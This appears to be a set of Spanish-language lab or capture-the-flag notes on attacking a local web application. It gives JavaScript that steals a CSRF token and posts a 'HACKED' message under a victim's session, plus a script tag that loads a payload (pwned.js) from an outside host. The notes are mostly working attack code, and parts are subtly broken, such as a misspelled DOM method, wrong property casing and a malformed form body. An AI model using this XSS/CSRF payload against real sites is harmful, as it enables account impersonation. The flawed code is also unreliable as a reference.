//Este script utiliza el token robado para cargar un post como el usuario de la cookie robada suplantando la identidad 

```js
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
	var data = "title=HACKED&subtitle=prueba&text=HACK&text=hackeado%20por%20anonymous_csrf_token=" + token;
	req2.open('POST', 'http://localhost:10007//newgossip', false);
	req2.withcredentials = true;
	req2.setRequestHeader('Content-type', 'application/x-www-form-url-encoded');
	req2.send(data);
```

Para cargar el archivo pwned.js introduciremos esto:

```js
	<script src="http://192.168.111.45/pwned.js"></script>
```

Para decodear la respuesta de base 64:

	echo -n "respuesta" | base64 -d; echo
